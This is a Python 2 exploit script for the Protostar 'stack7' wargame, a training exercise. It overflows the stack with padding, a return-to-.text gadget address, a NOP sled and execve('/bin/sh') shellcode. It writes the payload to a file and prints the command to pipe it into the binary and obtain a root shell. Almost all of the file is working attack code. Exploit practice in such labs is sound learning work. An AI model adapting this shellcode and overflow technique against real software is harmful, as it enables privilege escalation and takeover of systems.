# return to .text exploit --> same method as in stack6 variant
# not able to use included /bin/sh here as address is filtered out

import struct

padding = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS" #add 4 bytes to account for unsigned int

ret = struct.pack("I", 0x8048544) #address of ret in getpath (could be any ret instruction in binary)
eip = struct.pack("I", 0xbffff68c+50) #after NOP gadget set eip to esp (point eip to stack)...
nopslide = "\x90"*100
#... where the shellcode is stored
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

file = open("exp", "w")
file.write(padding + ret + eip + nopslide + payload)
file.close()

print "Use following command to open root shell:"
print "(cat exp ; cat) | /opt/protostar/bin/stack7"
print "Then use 'id' or 'whoami' to verify root"
